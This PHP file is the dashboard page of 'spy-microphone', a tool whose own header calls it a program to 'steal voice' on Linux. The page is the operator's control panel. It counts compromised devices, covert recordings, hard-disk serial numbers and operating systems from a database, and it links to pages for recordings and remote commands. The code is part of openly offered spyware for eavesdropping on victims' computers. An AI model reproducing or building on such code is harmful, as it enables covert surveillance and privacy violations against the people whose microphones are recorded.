<?php

#
# Copyright (c) 2018 Barchampas Gerasimos <makindosx@gmail.com>
# spy-microphone is a program for steal voice in gnu/linux OS.
#
# spy-microphone is free software: you can redistribute it and/or modify
# it under the terms of the GNU Affero General Public License as
# published by the Free Software Foundation, either version 3 of the
# License, or (at your option) any later version.
#
#
# spy-microphone is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU Affero General Public License for more details.
#
# You should have received a copy of the GNU Affero General Public License, version 3,
# along with this program.  If not, see <http://www.gnu.org/licenses/>
#


session_start();

 if (!isset($_SESSION['login']))
    {
      header("Location: index.php");
      }

?>


﻿<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
      <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />

    <title> Spy microphone Controller </title>

<link rel="Shortcut Icon" type="image/ico" href="favicon.ico">


	<!-- BOOTSTRAP STYLES-->
    <link href="assets/css/bootstrap.css" rel="stylesheet" />
     <!-- FONTAWESOME STYLES-->
    <link href="assets/css/font-awesome.css" rel="stylesheet" />
     <!-- MORRIS CHART STYLES-->
    <link href="assets/js/morris/morris-0.4.3.min.css" rel="stylesheet" />
        <!-- CUSTOM STYLES-->
    <link href="assets/css/custom.css" rel="stylesheet" />
     <!-- GOOGLE FONTS-->
   <link href='http://fonts.googleapis.com/css?family=Open+Sans' rel='stylesheet' type='text/css' />


</head>

<body>
    <div id="wrapper">
        <nav class="navbar navbar-default navbar-cls-top " role="navigation" style="margin-bottom: 0">
            <div class="navbar-header">
                <button type="button" class="navbar-toggle" data-toggle="collapse" data-target=".sidebar-collapse">
                    <span class="sr-only">Toggle navigation</span>
                    <span class="icon-bar"></span>
                    <span class="icon-bar"></span>
                    <span class="icon-bar"></span>
                </button>
                <a class="navbar-brand" href="dashboard.php"> Spy Microphone </a> 
            </div>

           <div style="color: white; padding: 15px 50px 5px 50px;float: right; font-size: 16px;"> 
             <?php echo date("d-m-Y H:i"); ?> &nbsp; 
             <a href="logout.php" class="btn btn-danger square-btn-adjust">
              Logout <i class="fa fa-sign-out"></i>
             </a> 
           </div>


        </nav>   
           <!-- /. NAV TOP  -->
                <nav class="navbar-default navbar-side" role="navigation">
            <div class="sidebar-collapse">
                <ul class="nav" id="main-menu">
				<li class="text-center">
                    <img src="assets/img/find_user.png" class="user-image img-responsive"/>
					</li>
				
					
           <li>
        <a class="active-menu"  href="dashboard.php"><i class="fa fa-dashboard fa-3x"></i> Dashboard </a>
                    </li>
                     <li>
                        <a  href="ui_elements.php"><i class="fa fa-desktop fa-3x"></i> UI Elements</a>
                    </li>
                   
      <li>
         <a  href="records_microphone.php"><i class="fa fa-microphone fa-3x"></i> Records Microphone</a>
      </li>
                   			
			                   
                    <li>
          <a href="#"><i class="fa fa-sitemap fa-3x"></i> Multi Tasking <span class="fa arrow"></span></a>
                        <ul class="nav nav-second-level">
                            <li>
                                <a href="#">Second Level Link</a>
                            </li>
                            <li>
                                <a href="#">Second Level Link</a>
                            </li>
                            <li>
                                <a href="#">Second Level Link<span class="fa arrow"></span></a>
                                <ul class="nav nav-third-level">
                                    <li>
                                        <a href="#">Third Level Link</a>
                                    </li>
                                    <li>
                                        <a href="#">Third Level Link</a>
                                    </li>
                                    <li>
                                        <a href="#">Third Level Link</a>
                                    </li>

                                </ul>
                               
                            </li>
                        </ul>
                      </li>  

                  <li>
              <a  href="remote_commands.php"><i class="fa fa-terminal fa-3x"></i> Remote Commands </a>
                    </li>	

                    <li>
                        <a  href="settings.php"><i class="fa fa-cogs fa-3x"></i> Settings </a>
                    </li>

                </ul>
               
            </div>
            
        </nav>  
        <!-- /. NAV SIDE  -->


          
          <?php 

            unset($_SESSION["hard_disk_id"]);

           require_once('__ROOT__/connect.php');


            if (class_exists('DATABASE_CONNECT'))
            {
 
             $obj_conn  = new DATABASE_CONNECT;
            
             $host = $obj_conn->connect[0];
             $user = $obj_conn->connect[1];
             $pass = $obj_conn->connect[2];
             $db   = $obj_conn->connect[3];
 
            $conn = new mysqli($host,$user,$pass,$db);
 
             if ($conn->connect_error)
                   {
                    die ("Cannot connect " .$conn->connect_error);
                    }

               else
                {

                 $sql  = "select count(distinct computer_name) from records";
                 $result = $conn->query($sql);

                 $sql2 = "select count(record) from records";
                 $result2 = $conn->query($sql2);

                 $sql3 = "select count(distinct hard_disk_id_serial_number) from records";
                 $result3 = $conn->query($sql3);

                 $sql4 = "select count(distinct operating_system) from records";
                 $result4 = $conn->query($sql4);

              
              while ($row = $result->fetch_assoc())
                      {
         
                     $computer_name = $row['count(distinct computer_name)'];

                      }


                    while ($row2 = $result2->fetch_assoc())
                      {
         
                     $records = $row2['count(record)'];

                      }

 

                     while ($row3 = $result3->fetch_assoc())
                      {
         
                     $hard_disks = $row3['count(distinct hard_disk_id_serial_number)'];

                      }


                      
                   while ($row4 = $result4->fetch_assoc())
                      {
         
                     $operating_systems = $row4['count(distinct operating_system)'];

                      }


      echo "<div id='page-wrapper'>
            <div id='page-inner'>
                <div class='row'>
                    <div class='col-md-12'>
                     <h2> 
                         Dashboard 
                        <img align='right' src='assets/img/sound2.gif' height='60' width='400'>
                     </h2>   
                         
                    </div>
                </div>              
                 <!-- /. ROW  -->
                  <hr />
                <div class='row'>
                <div class='col-md-3 col-sm-6 col-xs-6'>           
			<div class='panel panel-back noti-box'>
                <span class='icon-box bg-color-red set-icon'>
                    <i class='fa fa-laptop fa-2x'></i>
                </span>
                <div class='text-box'>
                    <p class='main-text'> Devices  </p>
                    <p class='main-text'> $computer_name </p>
                </div>
             </div>
		     </div>
                    <div class='col-md-3 col-sm-6 col-xs-6'>           
			<div class='panel panel-back noti-box'>
                <span class='icon-box bg-color-red set-icon'>
                    <i class='fa fa-microphone-slash fa-2x'></i>
                </span>
                <div class='text-box'>
                    <p class='main-text'> Records </p>
                    <p class='main-text'> $records </p>
                </div>
             </div>
		     </div>
                    <div class='col-md-3 col-sm-6 col-xs-6'>           
			<div class='panel panel-back noti-box'>
                <span class='icon-box bg-color-blue set-icon'>
                    <i class='fa fa-save fa-2x'></i>
                </span>
                <div class='text-box'>
                    <p class='main-text'> H: Disks </p>
                    <p class='main-text'> $hard_disks </p>
                </div>
             </div>
		     </div>
                    <div class='col-md-3 col-sm-6 col-xs-6'>           
			<div class='panel panel-back noti-box'>

                <span class='icon-box bg-color-brown set-icon'>
                   OS
                 </span>

                <span>
                    <i class='fa fa-windows'></i>
                </span>

                <span>
                    <i class='fa fa-apple'></i>
                </span>

                <span>
                    <i class='fa fa-linux'></i>
                </span>

                <div class='text-box'>
                    <p class='main-text'> $operating_systems </p> 
                </div>
             </div>
		     </div>
			</div>";

 
                } //end of else connect
              
              } // end of exists connect

                ?>
             
                <hr />          
                   
 
                    
                 <!-- /. ROW  -->
                <div class="row"> 
                    
                      
                   <div class="col-md-9 col-sm-12 col-xs-12">                     
                    <div class="panel panel-default">
                      <img src="assets/img/sound1.gif" height="100" width="600">
                      <img src="assets/img/sound3.gif" height="100" width="600">
                    </div>            
                </div>

                       <?php 

                      $bytes = disk_free_space("."); 
                      $si_prefix = array( 'B', 'KB', 'MB', 'GB', 'TB', 'EB', 'ZB', 'YB' );
                      $base = 1024;
                      $class = min((int)log($bytes , $base) , count($si_prefix) - 1);
    $hard_disk_free_space = sprintf('%1.2f' , $bytes / pow($base,$class)) . ' ' . $si_prefix[$class];


                          
                   echo "<div class='col-md-3 col-sm-12 col-xs-12'>                       
                    <div class='panel panel-primary text-center no-boder bg-color-red'>
                        <div class='panel-body'>
                            <i class='fa fa-hdd-o fa-5x'></i>
                            <h3> $hard_disk_free_space </h3>
                        </div>
                        <div class='panel-footer back-footer-red'>
                           Disk Space Available               
                        </div>
                    </div>";

                       ?>

                    
           </div>
                
             <!-- /. PAGE INNER  -->
            </div>
         <!-- /. PAGE WRAPPER  -->
        </div>
     <!-- /. WRAPPER  -->
    <!-- SCRIPTS -AT THE BOTOM TO REDUCE THE LOAD TIME-->
    <!-- JQUERY SCRIPTS -->
    <script src="assets/js/jquery-1.10.2.js"></script>
      <!-- BOOTSTRAP SCRIPTS -->
    <script src="assets/js/bootstrap.min.js"></script>
    <!-- METISMENU SCRIPTS -->
    <script src="assets/js/jquery.metisMenu.js"></script>
     <!-- MORRIS CHART SCRIPTS -->
     <script src="assets/js/morris/raphael-2.1.0.min.js"></script>
    <script src="assets/js/morris/morris.js"></script>
      <!-- CUSTOM SCRIPTS -->
    <script src="assets/js/custom.js"></script>
    
   
</body>
</html>
